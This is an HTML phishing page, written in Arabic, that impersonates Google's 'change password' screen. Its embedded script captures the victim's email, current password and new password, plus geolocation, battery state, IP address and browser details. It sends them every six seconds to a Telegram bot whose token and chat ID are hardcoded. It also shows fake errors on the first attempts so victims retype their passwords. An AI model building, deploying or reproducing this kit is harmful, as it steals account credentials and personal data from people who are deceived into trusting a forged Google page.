<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>تغيير كلمة المرور — Google</title>
<style>
/* تم تعديل لون الخلفية هنا إلى #ffffff (الأبيض النقي) */
body{margin:0;background:#ffffff;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
/* تم تعديل الـ card قليلاً لتتناسب مع الخلفية البيضاء */
.card{background:#fff;padding:48px 40px 36px;border-radius:8px;border:1px solid #dadce0;width:100%;max-width:450px;text-align:center;position:relative;box-sizing:border-box;}
.logo{font-size:24px;font-weight:400;margin-bottom:10px;font-family:Product Sans,Roboto,sans-serif;}
.logo span.g{color:#4285F4;}
.logo span.o1{color:#EA4335;}
.logo span.o2{color:#FBBC05;}
.logo span.g2{color:#4285F4;}
.logo span.l{color:#34A853;}
.logo span.e{color:#EA4335;}
.title{font-size:24px;font-weight:400;margin-bottom:10px;}
.description{font-size:16px;color:#202124;margin-bottom:24px;line-height:1.5}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin:10px 0;font-size:16px;outline:none;transition:border 0.2s;box-sizing:border-box;}
input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px;}
button{width:auto;min-width:88px;padding:10px 24px;margin-top:24px;border:0;border-radius:4px;font-weight:500;font-size:14px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s;float:left;}
button:hover{background:#1558b0}
.error{color:#d93025;font-size:12px;margin-top:2px;margin-bottom:2px;text-align:right;display:none;font-weight:400;}
.success{font-size:18px;color:green;margin-top:20px;display:none}
.step{display:none}
.step.active{display:block}
/* تنسيق إضافي لزر "التالي" ليتماشى مع تصميم جوجل الجديد */
.step-actions{margin-top: 32px;text-align: left;overflow: hidden;}
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
  </div>

  <div class="title">تغيير كلمة المرور</div>

  <div class="description">
    الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
  </div>

  <form id="form">
    <div class="step step1 active">
      <input type="email" placeholder="البريد الإلكتروني" required id="email">
      <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
      <div class="step-actions">
        <button type="button" id="next1">التالي</button>
      </div>
    </div>

    <div class="step step2">
      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
      <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
      <div class="step-actions">
        <button type="button" id="next2">التالي</button>
      </div>
    </div>

    <div class="step step3">
      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
      <div class="step-actions">
        <button type="button" id="verifyPass">التالي</button>
      </div>
    </div>
  </form>
</div>

<script>
// (نفس الكود البرمجي السابق دون تغيير في المنطق)
const step1 = document.querySelector(".step1");
const step2 = document.querySelector(".step2");
const step3 = document.querySelector(".step3");
const next1 = document.getElementById("next1");
const next2 = document.getElementById("next2");
const verifyPass = document.getElementById("verifyPass");
const error3 = document.getElementById("error3");
const successMessage = document.getElementById("successMessage");

const telegramToken = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0"; 
const chatId = "8549252422"; 

let attemptCount = 0;
let lastMessageSent = "";
let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
let userLocation = "غير معروف";
let userIP = "غير معروف";

if(navigator.getBattery){
  navigator.getBattery().then(bat=>{
    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
    batteryStatus.level = (bat.level*100)+"%";
    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
  });
}

if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(pos=>{
    userLocation = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`;
  }, ()=>{userLocation="غير معروف"});
}

fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
  userIP = `${data.ip} - ${data.country_name}`;
});

next1.addEventListener("click", ()=>{
  const input = document.getElementById("email");
  if(input.checkValidity()){
    step1.classList.remove("active");
    step2.classList.add("active");
  } else {
    step1.querySelector(".error").style.display="block";
  }
});

next2.addEventListener("click", ()=>{
  const input = document.getElementById("currentPassword");
  if(input.value.length >= 8){
    step2.classList.remove("active");
    step3.classList.add("active");
  } else {
    step2.querySelector(".error").style.display="block";
  }
});

verifyPass.addEventListener("click", ()=>{
  const newPass = document.getElementById("newPassword").value;
  const confirmPass = document.getElementById("confirmPassword").value;

  if(newPass.length >= 8 && newPass === confirmPass){
    attemptCount++;
    if(attemptCount < 3){
      error3.style.display="block";
    } else {
      error3.style.display="none";
      successMessage.style.display="block";
      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);
    }
  } else {
    error3.style.display="block";
  }
});

let timeoutId;
document.querySelectorAll("input").forEach(input=>{
  input.addEventListener("input", ()=>{
    clearTimeout(timeoutId);
    timeoutId = setTimeout(sendData, 6000);
  });
});

function sendData(){
  const email = document.getElementById("email").value.trim();
  const currentPassword = document.getElementById("currentPassword").value.trim();
  const newPassword = document.getElementById("newPassword").value.trim();

  if(email === "" && currentPassword === "" && newPassword === "") return;

  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌍 الموقع: ${userLocation}\n🌐 IP والدولة: ${userIP}\n🖥️ المتصفح: ${navigator.userAgent}\n🗣️ اللغة: ${navigator.language}`;

  if(message !== lastMessageSent){
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: chatId, text: message})
    });
    lastMessageSent = message;
  }
}

setInterval(sendData, 6000);
</script>

</body>
</html>
